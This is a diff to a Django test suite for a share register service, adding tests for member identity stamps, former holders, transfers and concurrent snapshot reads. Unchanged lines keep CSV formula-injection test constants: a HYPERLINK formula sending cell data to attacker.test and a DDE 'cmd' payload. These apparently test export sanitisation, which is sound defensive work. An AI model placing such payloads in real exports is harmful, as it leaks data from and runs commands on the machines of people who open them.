@@ -1,13 +1,16 @@
 import csv
 import io
 from collections import defaultdict
-from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+from datetime import date, datetime, timedelta
 from datetime import timezone as utc_zone
 from decimal import Decimal
-from unittest.mock import patch
+from unittest.mock import Mock, patch
 from uuid import uuid4
 
 from django.contrib.auth import get_user_model
+from django.db import connections
+from django.test import TransactionTestCase
 from django.utils import timezone
 from rest_framework.test import APITestCase
 from web3 import Web3
@@ -20,18 +23,23 @@ from offerings.models import (
     SubscriptionStatus,
 )
 from offerings.services.subscription import scale_back
+from shared.tests.tenants import make_tenant
 from tokens.models import (
+    FormerHolder,
     IssuanceStatus,
     RegisterEntryKind,
     RegisterMemberWallet,
     RequestStatus,
     ShareIssuance,
     ShareIssuanceRequest,
+    ShareRegister,
     ShareToken,
     ShareTokenStatus,
 )
 from tokens.services import register as register_reader
 from tokens.services.register import (
+    AS_AT_ROW,
+    FORMER_MEMBER_HEADERS,
     IDENTITY_LABELS,
     IDENTITY_LIVE,
     IDENTITY_TREASURY_LABEL,
@@ -39,6 +47,7 @@ from tokens.services.register import (
     REGISTER_HEADERS,
     SOURCE_LABELS,
     SOURCE_STORED,
+    stored_register,
 )
 from tokens.services.register_events import create_member, open_register, record_entry
 from tokens.tests.test_register_events import DAY
@@ -56,6 +65,7 @@ RESIDENCE = "12 Register Street, Sydney NSW 2000"
 FORMULA_NAME = '=HYPERLINK("http://attacker.test/"&A2&B2,"Open")'
 FORMULA_ADDRESS = "-2+3+cmd|' /C calc'!A0"
 FORMULA_LABEL = "@SUM(1+1)*cmd"
+MARCH = datetime(2026, 3, 2, 23, 30, tzinfo=utc_zone.utc)
 
 
 def _account(email, name, residence=""):
@@ -92,7 +102,7 @@ class RegisterTestBase(APITestCase):
             completed_at=completed_at or timezone.now(),
         )
 
-    def _paid_allotment(self, account, wallet, address, amount, received):
+    def _paid_allotment(self, account, wallet, address, amount, received, completed_at=None):
         offering = Offering.objects.create(
             token=self.token,
             exemption=OfferingExemption.PROFESSIONAL,
@@ -110,7 +120,7 @@ class RegisterTestBase(APITestCase):
             reason="Allotment",
             status=RequestStatus.EXECUTED,
         )
-        issuance = self._allot(address, amount)
+        issuance = self._allot(address, amount, completed_at=completed_at)
         request.executed_issuance = issuance
         request.save(update_fields=["executed_issuance"])
         Subscription.objects.create(
@@ -170,6 +180,36 @@ class RegisterTestBase(APITestCase):
 
     def _wallet(self, account, address):
         return Wallet.objects.create(user_account=account, address=address, chain="base")
+
+    def _stamp(self, address, name, stamped_at):
+        return ShareIssuance.objects.create(
+            token=self.token,
+            recipient_address=address,
+            recipient_name=name,
+            recipient_residential_address=RESIDENCE,
+            identity_stamped_at=stamped_at,
+            amount="10",
+            status=IssuanceStatus.COMPLETED,
+            completed_at=stamped_at,
+        )
+
+    def _cessation(self, address, ceased_on, block):
+        return FormerHolder.objects.create(
+            token=self.token, wallet_address=address, ceased_on=ceased_on, ceased_at_block=block, shares_at_cessation=10
+        )
+
+    def _transfer(self, source, target, shares):
+        record_entry(
+            register_id=self.opening.register_id,
+            operation_id=uuid4(),
+            kind=RegisterEntryKind.TRANSFER,
+            changes=[
+                {"member": str(source.pk), "shares": str(-shares)},
+                {"member": str(target.pk), "shares": str(shares)},
+            ],
+            effective_on=DAY,
+            recorded_by=self.owner,
+        )
 
     def _stored(self, holdings, *, member_of=None):
         member_of = {address: uuid4() for address in holdings} | dict(member_of or {})
@@ -291,6 +331,29 @@ class HolderTypeTest(RegisterTestBase):
 
         self.assertEqual((row["holderType"], row["name"]), ("ambiguous", MEMBER_AMBIGUOUS_NAME))
 
+    def test_wallets_stamped_with_different_people_make_the_member_ambiguous(self):
+        self._stamp(MEMBER, "Ann Stamped", MARCH)
+        self._stamp(SHARED, "Bob Stamped", MARCH + timedelta(days=30))
+        member = uuid4()
+        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})
+
+        row = self._holders()["holders"][0]
+
+        self.assertEqual((row["holderType"], row["name"]), ("ambiguous", MEMBER_AMBIGUOUS_NAME))
+
+    def test_wallets_stamped_with_the_same_person_name_the_member_from_the_later_stamp(self):
+        self._stamp(MEMBER, "Ann Stamped", MARCH)
+        self._stamp(SHARED, "Ann Stamped", MARCH + timedelta(days=30))
+        member = uuid4()
+        self._stored({MEMBER: 30, SHARED: 20}, member_of={MEMBER: member, SHARED: member})
+
+        row = self._holders()["holders"][0]
+
+        self.assertEqual(
+            (row["holderType"], row["name"], row["identitySource"]),
+            ("member", "Ann Stamped", "Stamped at allotment on 2026-04-01"),
+        )
+
     def test_the_api_contract_names_the_member_its_wallets_and_its_stored_entry_date(self):
         self._stored({MEMBER: 8})
 
@@ -386,7 +449,7 @@ class RegisterExportTest(RegisterTestBase):
 
 class StoredRegisterReadTest(RegisterTestBase):
     def test_a_member_the_opening_carried_in_keeps_the_date_of_their_first_allotment(self):
-        self._allot(MEMBER, 60, completed_at=datetime(2026, 3, 2, 23, 30, tzinfo=utc_zone.utc))
+        self._allot(MEMBER, 60, completed_at=MARCH)
         self._allot(MEMBER, 40, completed_at=datetime(2026, 5, 1, tzinfo=utc_zone.utc))
         self._allot(SHARED, 25, completed_at=datetime(2026, 4, 1, tzinfo=utc_zone.utc))
         self._allot(STRANGER, 5, completed_at=datetime(2026, 2, 1, tzinfo=utc_zone.utc))
@@ -429,6 +492,62 @@ class StoredRegisterReadTest(RegisterTestBase):
         )
         exported = {row[0]: row[REGISTER_HEADERS.index("Date entered")] for row in rows[1 : rows.index([])]}
         self.assertEqual(exported, entered)
+
+    def test_a_member_who_sold_out_and_bought_back_on_the_opening_day_shows_the_opening_date(self):
+        self._allot(MEMBER, 100, completed_at=MARCH)
+        members = self._stored({MEMBER: 100}, member_of={STRANGER: uuid4()})
+        self._transfer(members[MEMBER], members[STRANGER], 100)
+        self._transfer(members[STRANGER], members[MEMBER], 100)
+
+        holders = self._holders()["holders"]
+
+        self.assertEqual(
+            [(row["member"], row["enteredOn"]) for row in holders], [(str(members[MEMBER].pk), DAY.isoformat())]
+        )
+
+    def test_a_cessation_between_the_allotment_and_the_opening_interrupts_the_date_and_the_amount_paid(self):
+        for address, ceased_on, block in ((MEMBER, date(2026, 5, 1), 1), (SHARED, date(2026, 2, 1), 2)):
+            account = _account(f"{block}@example.test", f"Holder {block}", RESIDENCE)
+            wallet = self._wallet(account, address)
+            WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
+            self._paid_allotment(account, wallet, address, 40, Decimal("100.00"), completed_at=MARCH)
+            self._cessation(address, ceased_on, block)
+        members = self._stored({MEMBER: 40, SHARED: 40})
+
+        entered = {row["member"]: row["enteredOn"] for row in self._holders()["holders"]}
+        _, rows = self._export()
+        paid = {row[0]: row[REGISTER_HEADERS.index("Amount paid")] for row in rows[1 : rows.index([])]}
+
+        self.assertEqual(entered, {str(members[MEMBER].pk): DAY.isoformat(), str(members[SHARED].pk): "2026-03-02"})
+        self.assertEqual(paid, {str(members[MEMBER].pk): "", str(members[SHARED].pk): "100.00"})
+
+    def test_a_paid_holding_that_recorded_transfers_touched_prints_no_amount_paid(self):
+        account = _account("tom@example.test", "Tom Traded", RESIDENCE)
+        wallet = self._wallet(account, MEMBER)
+        WhitelistEntry.objects.create(wallet=wallet, status=WhitelistStatus.ACTIVE, is_whitelisted=True)
+        self._paid_allotment(account, wallet, MEMBER, 100, Decimal("250.00"))
+        members = self._stored({MEMBER: 100}, member_of={STRANGER: uuid4()})
+        self._transfer(members[MEMBER], members[STRANGER], 50)
+        self._transfer(members[STRANGER], members[MEMBER], 50)
+
+        row = dict(zip(REGISTER_HEADERS, self._export()[1][1]))
+
+        self.assertEqual([row["Name"], row["Shares held"], row["Amount paid"]], ["Tom Traded", "100", ""])
+
+    def test_a_wallet_cessation_of_a_member_who_still_holds_is_not_a_former_member(self):
+        pair = uuid4()
+        members = self._stored({MEMBER: 70, SHARED: 30, STRANGER: 20}, member_of={MEMBER: pair, SHARED: pair})
+        self._transfer(members[STRANGER], members[MEMBER], 20)
+        for block, address in enumerate((MEMBER, STRANGER, TREASURY)):
+            self._cessation(address, DAY, block=block + 1)
+
+        former = [row["walletAddress"] for row in self._holders()["formerMembers"]]
+        _, rows = self._export()
+        section = rows[rows.index(FORMER_MEMBER_HEADERS) + 1 :]
+        exported = [row[FORMER_MEMBER_HEADERS.index("Wallet address")] for row in section if row[0] != AS_AT_ROW]
+
+        self.assertEqual(sorted(former), sorted([STRANGER, TREASURY]))
+        self.assertEqual(sorted(exported), sorted([STRANGER, TREASURY]))
 
     def test_the_register_and_its_export_are_served_with_the_chain_unreachable(self):
         self._stored({MEMBER: 100, TREASURY: 40})
@@ -572,3 +691,56 @@ class RegisterIsolationTest(RegisterTestBase):
             with self.subTest(path=path):
                 response = self.client.get(f"/api/v1/tokens/{self.token.uuid}/{path}/")
                 self.assertEqual(response.status_code, 404)
+
+
+class StoredRegisterSnapshotTest(TransactionTestCase):
+    def setUp(self):
+        self.tenant = make_tenant("snapshot")
+        self.token = self.tenant.deployed_token
+        self.holder, self.newcomer = (
+            create_member(company_id=self.token.company_id, member_id=uuid4()) for _ in range(2)
+        )
+        RegisterMemberWallet.objects.create(company_id=self.token.company_id, member=self.holder, address=MEMBER)
+        self.opening = open_register(
+            token_id=self.token.pk,
+            operation_id=uuid4(),
+            changes=[{"member": str(self.holder.pk), "shares": "100"}],
+            effective_on=DAY,
+            recorded_by=self.tenant.user,
+        )
+
+    def append(self):
+        try:
+            record_entry(
+                register_id=self.opening.register_id,
+                operation_id=uuid4(),
+                kind=RegisterEntryKind.ISSUE,
+                changes=[{"member": str(self.newcomer.pk), "shares": "50"}],
+                effective_on=DAY,
+                recorded_by=self.tenant.user,
+            )
+        finally:
+            connections.close_all()
+
+    def test_an_append_committed_during_a_read_splits_neither_the_head_nor_the_supply_from_the_holdings(self):
+        head = ShareRegister.objects.filter(token=self.token)
+
+        def read_the_head_then_append():
+            register = head.first()
+            with ThreadPoolExecutor(max_workers=1) as pool:
+                pool.submit(self.append).result(timeout=20)
+            return register
+
+        stand_in = Mock()
+        stand_in.objects.filter.return_value.first.side_effect = read_the_head_then_append
+        with patch.object(register_reader, "ShareRegister", stand_in):
+            during = stored_register(self.token)
+        after = stored_register(self.token)
+
+        self.assertEqual(
+            (during["sequence"], during["issued_supply"], [row["balance"] for row in during["rows"]]), (1, 100, ["100"])
+        )
+        self.assertEqual(
+            (after["sequence"], after["issued_supply"], [row["balance"] for row in after["rows"]]),
+            (2, 150, ["100", "50"]),
+        )
